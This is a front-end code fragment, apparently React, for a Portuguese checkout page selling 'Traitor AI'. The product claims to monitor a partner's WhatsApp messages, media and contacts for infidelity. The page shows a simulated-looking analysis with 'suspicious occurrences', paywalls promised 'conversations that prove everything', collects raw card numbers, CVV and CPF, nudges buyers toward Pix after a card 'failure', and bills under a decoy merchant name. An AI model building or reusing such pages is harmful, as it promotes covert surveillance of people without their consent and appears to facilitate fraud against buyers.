            <div className="grid items-stretch gap-8 lg:grid-cols-[1.4fr,1fr]">
              <div className="rounded-[2rem] border border-rose-100/60 bg-white/90 p-6 shadow-lg shadow-rose-100/30 backdrop-blur sm:p-8">
                <h3 className="text-center text-xl font-bold text-slate-800 sm:text-2xl">
                  <span className="text-rose-400">💕</span> Confiança e{' '}
                  <span className="text-rose-500">Transparência</span>
                  <br />
                  nos Relacionamentos
                </h3>
                <div className="mt-5 space-y-4 text-sm leading-relaxed text-slate-600 sm:text-base">
                  <p>
                    Em todo relacionamento, a confiança mútua é essencial. Mas, por diversos motivos, problemas podem surgir, e um dos mais delicados é a <strong className="text-slate-800">traição</strong>. Traições podem abalar drasticamente a confiança e a conexão entre duas pessoas.
                  </p>
                  <p>
                    <strong className="text-slate-800">Traitor AI</strong> oferece uma ferramenta que ajuda a esclarecer dúvidas e trazer à tona informações que às vezes <strong className="text-slate-800">não são ditas</strong>, promovendo mais <strong className="text-slate-800">transparência</strong> e, consequentemente, reforçando a confiança entre o casal.
                  </p>
                </div>
              </div>

              <div className="relative flex items-center justify-center">
                <div className="card-surface w-full border border-white/60 bg-white/90 text-center shadow-2xl shadow-rose-200/60 backdrop-blur-xl">
                  <div className="flex flex-col items-center gap-4">
                    {profilePictureUrl ? (
                      <div className="relative">
                        <div className="h-28 w-28 overflow-hidden rounded-3xl border-4 border-white shadow-xl shadow-rose-200/70">
                          <img
                            src={profilePictureUrl}
                            alt={profileData?.name || 'Foto do perfil'}
                            className="h-full w-full object-cover"
                            onError={() => setProfilePictureUrl('')}
                          />
                        </div>
                        <span className="absolute -bottom-3 left-1/2 -translate-x-1/2 rounded-full bg-rose-500 px-3 py-1 text-xs font-semibold text-white shadow-lg">
                          Perfil validado
                        </span>
                      </div>
                    ) : (
                      <div className="flex h-20 w-20 items-center justify-center rounded-3xl border border-slate-200 bg-white text-3xl font-bold text-slate-400 shadow-lg shadow-slate-200/60">
                        <UserRound className="h-10 w-10" strokeWidth={1.5} />
                      </div>
                    )}

                    <div>
                      <h3 className="text-xl font-semibold text-slate-900">{displayName}</h3>
                      {profileData?.status?.status && (
                        <p className="mt-1 text-sm italic text-slate-500">"{profileData.status.status}"</p>
                      )}
                    </div>

                    <div className="w-full space-y-3">
                      <div className="flex items-center justify-between text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">
                        <span>Mensagens</span>
                        <span>Mídias</span>
                        <span>Contatos</span>
                      </div>
                      <div className="h-3 w-full overflow-hidden rounded-full bg-slate-200">
                        <div
                          className="h-full rounded-full bg-gradient-to-r from-rose-500 via-pink-500 to-amber-400 transition-all duration-500"
                          style={{ width: `${progressPercentage}%` }}
                        />
                      </div>
                      <p className="text-xs text-slate-500">
                        Monitorando atividade suspeita em todos os canais.
                      </p>
                    </div>
                  </div>
                </div>
                <div className="absolute -inset-4 -z-10 rounded-3xl bg-gradient-to-br from-rose-100 via-transparent to-rose-200 opacity-60 blur-3xl"></div>
              </div>
            </div>

            {/* Row 2: Three info cards centered */}
            <div className="grid gap-4 md:grid-cols-3">
              <div className="group relative overflow-hidden rounded-3xl border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                <div className="pointer-events-none absolute -right-8 top-1/2 h-24 w-24 -translate-y-1/2 rounded-full bg-rose-100/40 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                <div className="relative flex items-center justify-between gap-4">
                  <div>
                    <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">WhatsApp</span>
                    <p className="mt-4 text-2xl font-semibold text-slate-900">{formattedWhatsapp || rawWhatsapp}</p>
                  </div>
                  <span className="flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl border border-rose-100 bg-rose-50 text-rose-500 shadow-sm">
                    <Phone className="h-5 w-5" />
                  </span>
                </div>
                <p className="mt-4 text-xs text-slate-500">Número verificado para a análise atual.</p>
              </div>

              <div className="group relative overflow-hidden rounded-3xl border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                <div className="pointer-events-none absolute -left-10 top-0 h-24 w-24 rounded-full bg-emerald-100/40 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                <div className="relative flex items-center justify-between gap-4">
                  <div>
                    <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">Status</span>
                    <p className={`mt-4 text-xl font-semibold ${isAnalyzing ? 'text-amber-600' : 'text-emerald-600'}`}>
                      {isAnalyzing ? 'Processando dados' : 'Análise concluída'}
                    </p>
                  </div>
                  <span
                    className={`flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl border shadow-sm ${
                      isAnalyzing ? 'border-amber-100 bg-amber-50 text-amber-500' : 'border-emerald-100 bg-emerald-50 text-emerald-500'
                    }`}
                  >
                    <ShieldCheck className="h-5 w-5" />
                  </span>
                </div>
                <p className="mt-4 text-xs text-slate-500">
                  {isAnalyzing ? 'Nossa IA está cruzando conversas e mídias.' : 'Os resultados completos estão prontos para consulta.'}
                </p>
              </div>

              <div className="group relative overflow-hidden rounded-3xl border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                <div className="pointer-events-none absolute -right-12 bottom-0 h-24 w-24 rounded-full bg-amber-100/50 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                <div className="relative flex items-center justify-between gap-4">
                  <div>
                    <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">Progresso</span>
                    <div className="mt-4 flex items-baseline gap-2">
                      <p className="text-3xl font-semibold text-slate-900">{progressPercentage}%</p>
                      <span className="text-[11px] uppercase tracking-[0.32em] text-slate-400">completo</span>
                    </div>
                  </div>
                  <span className="flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl border border-rose-100 bg-rose-50 text-rose-500 shadow-sm">
                    <TrendingUp className="h-5 w-5" />
                  </span>
                </div>
                <p className="mt-4 text-xs text-slate-500">Atualizamos o andamento em tempo real a cada etapa concluída.</p>
              </div>
            </div>
          </div>
        </section>

        <section
          ref={progressSectionRef}
          className="relative pb-12"
        >
          <div className="mx-auto max-w-5xl px-4">
            <div className="card-surface border border-white/60 bg-white/90 shadow-xl backdrop-blur-xl">
              <div className="flex flex-col gap-6 md:flex-row md:items-center md:justify-between">
                <div>
                  <span className="text-xs font-semibold uppercase tracking-[0.28em] text-rose-500">
                    Etapas em execução
                  </span>
                  <h3 className="mt-2 text-2xl font-semibold text-slate-900">Progresso da análise</h3>
                  <p className="mt-2 text-sm text-slate-500">
                    Cada verificação é conduzida com inteligência artificial e protocolos forenses.
                  </p>
                </div>
                <div className="text-left md:text-right">
                  <p className="text-sm text-slate-500">Tempo estimado</p>
                  <p className="text-xl font-semibold text-slate-900">
                    {isAnalyzing ? 'Aguardando finalização...' : 'Pronto para liberar'}
                  </p>
                </div>
              </div>

              <div className="mt-6 sm:mt-8">
                <div className="hidden sm:block">
                  <div className="h-2 w-full overflow-hidden rounded-full bg-slate-200">
                    <div
                      className="h-full rounded-full bg-gradient-to-r from-rose-500 via-pink-500 to-amber-400 transition-all duration-500"
                      style={{ width: `${progressPercentage}%` }}
                    />
                  </div>
                </div>

                <div className="mt-4 space-y-3 sm:mt-8 sm:space-y-4">
                  {steps.map((step, index) => {
                    const isCurrent = index === currentStep && isAnalyzing
                    const isDone = step.completed
                    return (
                      <div
                        id={`analysis-step-${index}`}
                        ref={element => {
                          stepRefs.current[index] = element
                        }}
                        key={step.id}
                        className={`relative overflow-hidden rounded-xl border p-3.5 transition-all duration-300 scroll-mt-32 sm:rounded-2xl sm:p-6 ${
                          isCurrent
                            ? 'border-rose-200 bg-white shadow-md shadow-rose-100/60'
                            : isDone
                              ? 'border-emerald-100 bg-white shadow-sm'
                              : 'border-slate-100 bg-white/80'
                        }`}
                      >
                        <div className="flex items-center gap-3 sm:gap-4">
                          <div
                            className={`flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-xl sm:h-12 sm:w-12 sm:rounded-2xl ${
                              isDone
                                ? 'bg-emerald-500 text-white shadow-sm shadow-emerald-200/60'
                                : isCurrent
                                ? 'bg-rose-500 text-white shadow-sm shadow-rose-200/60'
                                : 'bg-slate-100 text-slate-400'
                            }`}
                          >
                            {isDone ? (
                              <CheckCircle className="h-5 w-5 sm:h-6 sm:w-6" />
                            ) : isCurrent ? (
                              <div className="animate-spin">{step.icon}</div>
                            ) : (
                              step.icon
                            )}
                          </div>

                          <div className="min-w-0 flex-1">
                            <h4 className="text-sm font-semibold text-slate-900 sm:text-base">{step.title}</h4>
                            <p className="mt-0.5 hidden text-sm text-slate-500 sm:block">{step.description}</p>
                          </div>

                          <div className="flex flex-col items-end gap-1 text-right sm:gap-1.5">
                            {isCurrent && (
                              <span className="rounded-full bg-rose-100 px-2 py-0.5 text-[9px] font-bold uppercase tracking-[0.15em] text-rose-600 sm:px-3 sm:py-1 sm:text-[10px] sm:tracking-[0.2em]">
                                Em andamento
                              </span>
                            )}
                            {isDone && (
                              <span className="rounded-full bg-emerald-100 px-2 py-0.5 text-[9px] font-bold uppercase tracking-[0.15em] text-emerald-600 sm:px-3 sm:py-1 sm:text-[10px] sm:tracking-[0.2em]">
                                Concluído
                              </span>
                            )}
                            {step.completed && step.suspicious && (
                              <span className="inline-flex items-center gap-1 text-rose-500 sm:gap-1.5">
                                <AlertTriangle className="h-3 w-3 sm:h-3.5 sm:w-3.5" />
                                <span className="text-xs font-bold sm:text-sm">{step.count}</span>
                                <span className="text-[8px] font-semibold uppercase tracking-wider sm:text-[10px]">ocorrências</span>
                              </span>
                            )}
                          </div>
                        </div>
                      </div>
                    )
                  })}
                </div>
              </div>

            </div>
          </div>
        </section>

        {showPaymentPlans && (
          <section id="payment-plans" className="relative pb-16">
            <div className="mx-auto max-w-6xl px-4">
              <div className="text-center">
                <span className="section-subtitle">Relatório pronto</span>
                <h2 className="section-title mt-3 text-3xl md:text-4xl">
                  Libere o acesso ao relatório completo
                </h2>
                <p className="mx-auto mt-4 max-w-2xl text-base text-slate-600">
                  Encontramos contatos suspeitos com <strong>números, nomes e fotos</strong> das pessoas envolvidas, além de <strong>conversas completas</strong> que comprovam tudo. Escolha um plano para visualizar todos os detalhes.
                </p>
              </div>

              <div className="mt-8 grid gap-4 sm:mt-12 sm:gap-6 md:grid-cols-2">
                {planOptions.map(plan => {
                  const isSelected = plan.id === selectedPlan
                  return (
                    <button
                      type="button"
                      onClick={() => {
                        setPlanCommitted(true)
                        setSelectedPlan(plan.id)
                        setAnalysisData((prev: any) => {
                          const nextData = prev ? { ...prev } : {}
                          nextData.selectedPlanId = plan.id
                          nextData.selectedPlanPrice = plan.priceValue
                          nextData.selectedPlanLabel = plan.priceLabel
                          nextData.selectedPlanName = plan.name
                          return nextData
                        })
                        void handleProceedToPayment({ forceSkipPlans: true, planOverride: plan.id })
                      }}
                      className={`group relative block rounded-2xl border-2 p-4 text-left transition-all duration-300 sm:rounded-[28px] sm:p-6 ${
                        isSelected
                          ? 'border-rose-400 bg-white shadow-xl shadow-rose-200/60'
                          : 'border-rose-100 bg-white/80 hover:-translate-y-1 hover:border-rose-200 hover:shadow-lg'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <span
                          className={`inline-flex items-center gap-1.5 rounded-full px-2.5 py-0.5 text-[10px] font-semibold uppercase tracking-[0.15em] sm:gap-2 sm:px-3 sm:py-1 sm:text-xs sm:tracking-[0.2em] ${
                            plan.highlight
                              ? 'bg-rose-500 text-white'
                              : 'bg-rose-100 text-rose-600'
                          }`}
                        >
                          {plan.badge}
                        </span>
                        <div
                          className={`flex h-5 w-5 items-center justify-center rounded-full border-2 sm:h-6 sm:w-6 ${
                            isSelected ? 'border-rose-500 bg-rose-500 text-white' : 'border-rose-200 text-transparent'
                          } transition-colors duration-300`}
                        >
                          <CheckCircle className="h-3 w-3 sm:h-4 sm:w-4" />
                        </div>
                      </div>

                      <div className="mt-3 space-y-2 sm:mt-6 sm:space-y-4">
                        <div>
                          <h3 className="text-lg font-semibold text-slate-900 sm:text-2xl">{plan.name}</h3>
                          <p className="mt-1 text-xs text-slate-600 sm:mt-2 sm:text-sm">{plan.subtitle}</p>
                        </div>
                        <div className="flex items-end gap-2">
                          <span className="text-2xl font-bold text-rose-600 sm:text-4xl">{plan.priceLabel}</span>
                          <span className="text-[10px] font-semibold uppercase tracking-[0.2em] text-slate-400 sm:text-xs sm:tracking-[0.28em]">
                            Pagamento único
                          </span>
                        </div>
                      </div>

                      <ul className="mt-3 space-y-2 text-xs text-slate-600 sm:mt-6 sm:space-y-3 sm:text-sm">
                        {plan.benefits.map(benefit => (
                          <li key={`${plan.id}-${benefit}`} className="flex items-start gap-2 sm:gap-3">
                            <span className="mt-0.5 flex h-4 w-4 flex-shrink-0 items-center justify-center rounded-full bg-rose-100 text-rose-500 sm:h-5 sm:w-5">
                              <CheckCircle className="h-2.5 w-2.5 sm:h-3.5 sm:w-3.5" />
                            </span>
                            <span>{benefit}</span>
                          </li>
                        ))}
                      </ul>

                      <div className="mt-4 flex items-center justify-between text-xs text-slate-500 sm:mt-8 sm:text-sm">
                        <span>{plan.highlight ? 'Acesso ilimitado' : 'Acesso por 7 dias'}</span>
                        <span className="inline-flex items-center gap-1.5 font-semibold text-rose-500 transition group-hover:text-rose-600 sm:gap-2">
                          Selecionar
                          <ArrowRight className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
                        </span>
                      </div>
                    </button>
                  )
                })}
              </div>
            </div>
          </section>
        )}

        {showPaymentMethods && (
          <section id="payment-methods" className="pb-16">
            <div className="mx-auto max-w-6xl px-4">
              <div className="card-surface border border-white/60 bg-white/90 p-4 shadow-2xl backdrop-blur-xl sm:p-8">
                {planPreselected && !showPaymentPlans && (
                  <div className="mb-6 flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-rose-100 bg-rose-50/60 px-4 py-3 text-xs font-medium text-rose-600 sm:text-sm">
                    <span>Plano escolhido na landing page.</span>
                    <button
                      type="button"
                      onClick={() => {
                        setShowPaymentMethods(false)
                        setShowPaymentPlans(true)
                        setTimeout(() => {
                          const plansElement = document.getElementById('payment-plans')
                          if (plansElement) {
                            plansElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
                          }
                        }, 100)
                      }}
                      className="inline-flex items-center gap-2 rounded-full border border-rose-300 bg-white px-4 py-1.5 font-semibold text-rose-600 transition hover:border-rose-400 hover:text-rose-700"
                    >
                      Trocar plano
                    </button>
                  </div>
                )}
                <div className="mb-6 text-center sm:mb-10">
                  <span className="inline-flex items-center gap-2 rounded-full border border-rose-100 bg-rose-50 px-3 py-0.5 text-[10px] font-semibold uppercase tracking-[0.15em] text-rose-500 sm:px-4 sm:py-1 sm:text-xs sm:tracking-[0.2em]">
                    Checkout seguro
                  </span>
                  <h3 className="mt-3 text-xl font-semibold text-slate-900 sm:mt-4 sm:text-3xl md:text-4xl">
                    Liberar relatório {selectedPlanOption.highlight ? 'vitalício' : 'completo'}
                  </h3>
                  <p className="mx-auto mt-2 max-w-2xl text-xs text-slate-600 sm:mt-3 sm:text-base">
                    Escolha a forma de pagamento e tenha acesso imediato às evidências.
                  </p>
                  <div className="mt-3 flex flex-col items-center gap-1 sm:mt-6 sm:gap-2">
                    <span className="text-base font-semibold text-rose-600 sm:text-lg">{planDisplayPrice} {showPixDiscount && <span className="text-xs font-medium text-emerald-600 sm:text-sm">(Pix: {pixDiscountDisplay})</span>}</span>
                    <p className="text-[10px] text-slate-500 sm:text-xs">Plano selecionado: {planDisplayName}</p>
                  </div>
                </div>

                <div className="mb-4 flex flex-col items-center gap-2 text-xs font-semibold text-emerald-600 sm:mb-8 sm:gap-3 sm:text-sm">
                  <div className="inline-flex items-center gap-1.5 rounded-full bg-emerald-50 px-3 py-1.5 sm:gap-2 sm:px-4 sm:py-2">
                    <CheckCircle className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
                    Pagamento protegido e aprovação instantânea
                  </div>
                </div>

                <div className="mx-auto mb-4 grid max-w-4xl grid-cols-2 gap-3 sm:mb-8 sm:grid-cols-1 sm:gap-6 md:grid-cols-2">
                  {/* Cartão de Crédito */}
                  <div
                    onClick={() => setPaymentMethod('card')}
                    className={`relative cursor-pointer group transition-all duration-300 ${
                      paymentMethod === 'card'
                        ? 'transform sm:scale-105'
                        : 'hover:sm:scale-102'
                    }`}
                  >
                    <div className={`relative p-4 rounded-2xl transition-all duration-300 sm:p-8 sm:rounded-3xl ${
                      paymentMethod === 'card'
                        ? 'bg-white border-2 border-red-500 shadow-xl shadow-red-500/20 sm:border-3 sm:shadow-2xl sm:shadow-red-500/30'
                        : 'bg-white border border-gray-200 hover:border-red-300 hover:shadow-lg sm:border-2 sm:hover:shadow-xl'
                    }`}>
                      <div className="mb-3 flex justify-center sm:mb-6">
                        <div className={`relative p-3 rounded-xl transition-all duration-300 sm:p-5 sm:rounded-2xl ${
                          paymentMethod === 'card'
                            ? 'bg-red-50 border border-red-200 sm:border-2'
                            : 'bg-gray-100 group-hover:bg-red-50'
                        }`}>
                          <CreditCard className="w-7 h-7 text-gray-700 group-hover:text-red-600 sm:w-12 sm:h-12" />
                        </div>
                      </div>
                      <div className="text-center">
                        <h3 className="mb-1 text-sm font-bold text-gray-900 sm:mb-3 sm:text-2xl">Cartão de Crédito</h3>
                        <p className="mb-2 text-[10px] text-gray-600 sm:mb-4 sm:text-sm">Visa • Mastercard • Elo</p>
                        <div className="flex items-center justify-center gap-1 text-[10px] sm:gap-2 sm:text-sm">
                          <Shield className="h-3 w-3 text-green-600 sm:h-4 sm:w-4" />
                          <span className="font-medium text-gray-700">Seguro</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* PIX */}
                  <div
                    onClick={() => setPaymentMethod('pix')}
                    className={`relative cursor-pointer group transition-all duration-300 ${
                      paymentMethod === 'pix'
                        ? 'transform sm:scale-105'
                        : 'hover:sm:scale-102'
                    }`}
                  >
                    <div className={`relative p-4 rounded-2xl transition-all duration-300 sm:p-8 sm:rounded-3xl ${
                      paymentMethod === 'pix'
                        ? 'bg-white border-2 border-green-500 shadow-xl shadow-green-500/20 sm:border-3 sm:shadow-2xl sm:shadow-green-500/30'
                        : 'bg-white border border-gray-200 hover:border-green-300 hover:shadow-lg sm:border-2 sm:hover:shadow-xl'
                    }`}>
                      <div className="mb-3 flex justify-center sm:mb-6">
                        <div className={`relative p-3 rounded-xl transition-all duration-300 sm:p-5 sm:rounded-2xl ${
                          paymentMethod === 'pix'
                            ? 'bg-green-50 border border-green-200 sm:border-2'
                            : 'bg-gray-100 group-hover:bg-green-50'
                        }`}>
                          <svg className="w-7 h-7 text-gray-700 group-hover:text-green-600 sm:w-12 sm:h-12" viewBox="0 0 512 512" fill="currentColor">
                            <path d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.2H112.6C132.6 391.2 151.5 383.4 165.7 369.2L242.4 292.5zM262.5 218.9C257.1 224.3 247.8 224.3 242.4 218.9L165.7 142.2C151.5 127.1 132.6 120.2 112.6 120.2H103.3L200.7 22.8C231.1-7.6 280.3-7.6 310.6 22.8L407.8 120H392.6C372.6 120 353.7 127.8 339.5 142L262.5 218.9zM112.6 142.7C126.4 142.7 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.5 392.6 142.5H430.3L488.6 200.8C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 363.3 355.5 353.5L278.5 276.5C264.6 262.6 240.3 262.6 226.4 276.5L149.7 353.2C139.1 363 126.4 368.6 112.6 368.6H80.78L22.76 310.6C-7.586 280.3-7.586 231.1 22.76 200.8L80.78 142.7H112.6z"/>
                          </svg>
                        </div>
                      </div>
                      <div className="text-center">
                        <h3 className="mb-1 text-sm font-bold text-gray-900 sm:mb-3 sm:text-2xl">PIX</h3>
                        <p className="mb-2 text-[10px] text-gray-600 sm:mb-4 sm:text-sm">Pagamento instantâneo</p>
                        <div className="flex items-center justify-center gap-1 text-[10px] sm:gap-2 sm:text-sm">
                          <CheckCircle className="h-3 w-3 text-green-600 sm:h-4 sm:w-4" />
                          <span className="font-semibold text-green-600">Imediata</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Payment Form - PIX */}
                {paymentMethod === 'pix' && (
                  <div className="mx-auto max-w-2xl">
                    {showPixDiscount && (
                      <div className="mb-4 rounded-xl border-2 border-yellow-400 bg-gradient-to-r from-yellow-50 to-orange-50 p-3 shadow-lg sm:mb-6 sm:rounded-2xl sm:p-6">
                        <div className="flex items-center gap-3 sm:gap-4">
                          <div className="flex-shrink-0 rounded-full bg-yellow-400 p-2 sm:p-3">
                            <Star className="h-5 w-5 text-white sm:h-8 sm:w-8" />
                          </div>
                          <div className="flex-1">
                            <h4 className="mb-1 text-sm font-bold text-yellow-900 sm:mb-2 sm:text-2xl">
                              🎉 Desconto de 20%!
                            </h4>
                            <p className="mb-2 text-xs text-yellow-800 sm:mb-4 sm:text-base">
                              Falha no cartão? Desconto exclusivo no PIX!
                            </p>
                            <div className="flex flex-wrap items-center gap-3">
                              <div className="flex items-baseline gap-1.5">
                                <span className="text-xs font-medium text-yellow-700">De:</span>
                                <span className="text-lg text-yellow-700 line-through">
                                  {planDisplayPrice}
                                </span>
                              </div>
                              <div className="flex items-baseline gap-1.5">
                                <span className="text-xs font-medium text-yellow-900">Por:</span>
                                <span className="text-2xl font-bold text-green-700">
                                  {pixDiscountDisplay}
                                </span>
                              </div>
                              <span className="rounded-full bg-yellow-400 px-3 py-1 text-xs font-bold text-yellow-900 shadow-sm">
                                -20% OFF
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                    <QRCodePix
                      amount={showPixDiscount ? pixDiscountValue : planValue}
                      whatsapp={analysisData?.whatsapp}
                      nome={displayName}
                      planId={selectedPlan}
                      planName={selectedPlanOption.name}
                      onPaymentConfirmed={handlePixPayment}
                    />
                    <p className="mt-4 text-center text-sm text-slate-500">
                      Ao confirmar o pagamento, o relatório será liberado automaticamente.
                    </p>
                  </div>
                )}

                {/* Payment Form - Cartão */}
                {paymentMethod === 'card' && (
                  <div className="mx-auto max-w-2xl">
                    <div className="space-y-2.5 sm:space-y-4">
                      <div className="mb-2 rounded-lg border border-blue-200 bg-blue-50 p-2.5 sm:mb-4 sm:rounded-xl sm:p-4">
                        <div className="flex items-start gap-2 sm:gap-3">
                          <div className="mt-0.5 text-blue-600 text-sm">ℹ️</div>
                          <div>
                            <h4 className="text-xs font-semibold text-blue-800 sm:mb-1 sm:text-sm">Observação importante</h4>
                            <p className="text-[10px] text-blue-700 sm:text-sm">
                              Fatura em nome de <strong>Comércio e Varejista Papel Pardo</strong> para discrição.
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-2 sm:gap-4 sm:grid-cols-2">
                        <div className="col-span-2 sm:col-span-1">
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            Número do Cartão *
                          </label>
                          <input
                            type="text"
                            name="cardNumber"
                            value={cardData.cardNumber}
                            onChange={handleCardInputChange}
                            placeholder="1234 5678 9012 3456"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                            maxLength={19}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div className="col-span-2 sm:col-span-1">
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            Nome no Cartão *
                          </label>
                          <input
                            type="text"
                            name="cardHolder"
                            value={cardData.cardHolder}
                            onChange={handleCardInputChange}
                            placeholder="NOME COMPLETO"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                            required
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-3 gap-2 sm:gap-4">
                        <div>
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            Validade *
                          </label>
                          <input
                            type="text"
                            name="expiryDate"
                            value={cardData.expiryDate}
                            onChange={handleCardInputChange}
                            placeholder="MM/AA"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                            maxLength={5}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            CVV *
                          </label>
                          <input
                            type="text"
                            name="cvv"
                            value={cardData.cvv}
                            onChange={handleCardInputChange}
                            placeholder="123"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                            maxLength={3}
                            inputMode="numeric"
                            required
                          />
                        </div>
                        <div>
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            CPF *
                          </label>
                          <input
                            type="text"
                            name="cpf"
                            value={cardData.cpf}
                            onChange={handleCardInputChange}
                            placeholder="000.000.000-00"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                            maxLength={14}
                            inputMode="numeric"
                            required
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-2 sm:gap-4">
                        <div>
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            E-mail
                          </label>
                          <input
                            type="email"
                            name="email"
                            value={cardData.email}
                            onChange={handleCardInputChange}
                            placeholder="seu@email.com"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                            pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                          />
                        </div>
                        <div>
                          <label className="mb-1 block text-xs font-semibold text-gray-800 sm:mb-2 sm:text-sm">
                            Telefone
                          </label>
                          <input
                            type="tel"
                            name="phone"
                            value={cardData.phone}
                            onChange={handleCardInputChange}
                            placeholder="(11) 99999-9999"
                            className="input-field h-10 px-3 py-2 text-sm sm:h-12 sm:px-4 sm:py-3"
                          />
                        </div>
                      </div>

                      {cardError && (
                        <div className="rounded-lg border border-red-200 bg-red-50 p-2.5 sm:rounded-xl sm:p-4">
                          <div className="flex items-start gap-2 sm:gap-3">
                            <AlertTriangle className="mt-0.5 h-4 w-4 flex-shrink-0 text-red-600 sm:h-5 sm:w-5" />
                            <div>
                              <h4 className="text-xs font-semibold text-red-800 sm:mb-1 sm:text-sm">Erro no pagamento</h4>
                              <p className="text-[10px] text-red-700 sm:text-sm">{cardError}</p>
                            </div>
                          </div>
                        </div>
                      )}

                      <button
                        type="button"
                        onClick={() => {
                          void handleCardPayment()
                        }}
                        disabled={isProcessing}
                        className="btn-gradient mt-2 flex w-full items-center justify-center gap-2 rounded-xl px-4 py-2.5 text-sm font-semibold shadow-lg shadow-rose-200/60 transition disabled:cursor-not-allowed disabled:opacity-70 sm:mt-6 sm:rounded-2xl sm:px-6 sm:py-4 sm:text-base"
                      >
                        {isProcessing ? (
                          <span className="flex items-center gap-2 text-sm font-semibold">
                            <span className="h-4 w-4 animate-spin rounded-full border-2 border-rose-200 border-t-rose-500"></span>
                            Processando pagamento...
                          </span>
                        ) : (
                          <>
                            <CreditCard className="mr-2 inline h-6 w-6" />
                            Pagar {planDisplayPrice}
                          </>
                        )}
                      </button>

                      <img
                        src="/images/seguranca.png"
                        alt="Site Seguro - SSL Certificado - Mercado Pago - Compra 100% Segura"
                        className="mx-auto mt-6 w-full max-w-md rounded-xl"
                      />
                    </div>
                  </div>
                )}
              </div>
            </div>
          </section>
        )}

        <section className="pb-20">
          <div className="mx-auto max-w-5xl px-4">
          <div className="relative overflow-hidden rounded-3xl border border-slate-100 bg-white/95 p-12 shadow-xl">
            <div className="pointer-events-none absolute inset-0 -z-10 opacity-70">
              <div className="absolute -top-32 left-1/2 h-64 w-64 -translate-x-1/2 rounded-full bg-emerald-100/40 blur-3xl"></div>
              <div className="absolute bottom-0 left-0 h-56 w-56 -translate-x-1/3 translate-y-1/3 rounded-full bg-sky-100/35 blur-3xl"></div>
              <div className="absolute -right-24 top-8 h-56 w-56 rounded-full bg-rose-100/35 blur-3xl"></div>
            </div>

            <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full border border-emerald-200 bg-white text-emerald-500 shadow-sm">
              <Shield className="h-8 w-8" />
            </div>
            <h3 className="mt-6 text-3xl font-semibold text-slate-900">Análise 100% sigilosa</h3>
            <p className="mt-3 text-base text-slate-600 md:text-lg">
              Toda a investigação passa por criptografia de ponta a ponta. Seus dados permanecem invisíveis para terceiros e são guardados em ambiente seguro.
            </p>

            <div className="mt-10 grid gap-6 text-left md:grid-cols-3">
              <div className="rounded-2xl border border-emerald-100 bg-white/95 p-6 shadow-sm">
                <div className="flex items-center gap-3 text-emerald-600">
                  <CheckCircle className="h-5 w-5" />
                  <span className="text-sm font-semibold uppercase tracking-[0.18em]">Criptografia</span>
                </div>
                <p className="mt-3 text-sm text-slate-600">
                  Camada extra de segurança na transmissão e no armazenamento das evidências coletadas.
                </p>
              </div>
              <div className="rounded-2xl border border-rose-100 bg-white/95 p-6 shadow-sm">
                <div className="flex items-center gap-3 text-rose-500">
                  <Lock className="h-5 w-5" />
                  <span className="text-sm font-semibold uppercase tracking-[0.18em]">Sigilo total</span>
                </div>
                <p className="mt-3 text-sm text-slate-600">
                  Cobrança discreta e acesso liberado apenas com autenticação do titular.
                </p>
              </div>
